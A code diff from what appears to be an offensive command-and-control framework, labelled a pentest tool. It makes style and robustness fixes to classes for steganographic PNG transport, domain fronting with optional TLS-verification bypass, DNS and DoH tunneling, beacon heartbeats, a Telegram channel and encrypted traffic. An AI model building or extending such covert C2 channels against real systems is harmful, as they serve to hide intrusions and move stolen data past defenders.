@@ -32,9 +32,6 @@ from typing import Any
 # Optional: True Steganography Support
 REQUESTS_AVAILABLE = False
 try:
-    import io
-    import zlib
-
     import requests
 
     REQUESTS_AVAILABLE = True
@@ -304,9 +301,9 @@ class StegoTransport:
 
             new_chunk = chunk_len + chunk_type + data + crc
             return png_bytes[:-12] + new_chunk + png_bytes[-12:]
-        except (ValueError, struct.error) as e:
+        except (OSError, ValueError, struct.error) as e:
             logger.debug("Stego encoding failed: %s", e)
-            return data
+            return png_bytes if isinstance(image_path, str) else data
 
     @staticmethod
     def extract_data(png_bytes: bytes) -> bytes | None:
@@ -376,6 +373,8 @@ class StegoTransport:
     @staticmethod
     def _extract_lsb(img) -> bytes | None:
         """True LSB Extraction."""
+        # Convert to RGB to handle RGBA/other formats
+        img = img.convert("RGB")
         pixels = list(img.getdata())
         bits = ""
         for r, g, b in pixels:
@@ -495,7 +494,7 @@ class DomainFronter:
         environments. This is a deliberate security decision for testing purposes.
         """
         # Create context with server authentication purpose
-        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)  # NOSONAR - Pentest tool intentionally allows verification bypass
+        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)  # NOSONAR - Pentest tool; noqa: E501
         context.minimum_version = ssl.TLSVersion.TLSv1_2
 
         if not verify:
@@ -659,7 +658,7 @@ class DNSTunneler:
                 resolver.timeout = 5
                 resolver.lifetime = 5
 
-                logger.debug(f"DNS Resolved query: {query_name} (type: %s)", record_type)
+                logger.debug("DNS Resolved query: %s (type: %s)", query_name, record_type)
 
                 # In a real C2, you'd specify your own authoritative nameserver
                 # Here we use system defaults or common ones for the demo
@@ -783,10 +782,8 @@ class DoHTransport:
             DNS wire format query bytes
 
         """
-        # Transaction ID (random)
-        import random
-        import struct
-        txn_id = random.randint(0, 65535)
+        # Transaction ID (random - use CSPRNG for DNS security)
+        txn_id = secrets.randbelow(65536)
 
         # Flags: Standard query
         flags = 0x0100  # RD (Recursion Desired)
@@ -1009,7 +1006,8 @@ class HeartbeatManager:
         self._max_failures = 5
 
         logger.info(
-            f"Heartbeat manager initialized (interval: {config.sleep_interval}s)",
+            "Heartbeat manager initialized (interval: %ss)",
+            config.sleep_interval,
         )
 
     def start(self) -> None:
@@ -1127,8 +1125,9 @@ class C2Channel:
             self.domain_fronter = DomainFronter(
                 self.config.fronting_domain,
                 self.config.actual_host,
-                self.config.primary_port,
+                verify_ssl=True,
                 profile=PROFILES.get(self.config.profile_name, PROFILES["default"]),
+                port=self.config.primary_port,
             )
 
         elif self.config.protocol == C2Protocol.TELEGRAM:
@@ -1137,7 +1136,7 @@ class C2Channel:
                 raise ValueError(msg)
             self.telegram = TelegramC2(
                 self.config.telegram_token,
-                self.config.telegram_chat_id,
+                self.config.telegram_chat_id,  # type: ignore[arg-type]
             )
             logger.info("C2 Channel: Telegram API Activated")
 
@@ -1169,7 +1168,7 @@ class C2Channel:
                 self.status = BeaconStatus.ACTIVE
 
                 # Start heartbeat
-                self.heartbeat = HeartbeatManager(self.config, callback=self._checkin)
+                self.heartbeat = HeartbeatManager(self.config, callback=self._checkin)  # type: ignore[arg-type]
                 self.heartbeat.start()
 
                 return True
@@ -1345,7 +1344,7 @@ class C2Channel:
         nonce = os.urandom(12)
         cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
         ciphertext, tag = cipher.encrypt_and_digest(data)
-        return base64.b64encode(cipher.nonce + tag + ciphertext)
+        return base64.b64encode(cipher.nonce + tag + ciphertext)  # type: ignore[operator]
 
     def _decrypt(self, data: bytes) -> bytes:
         """Decrypt AES-256-GCM encrypted data."""
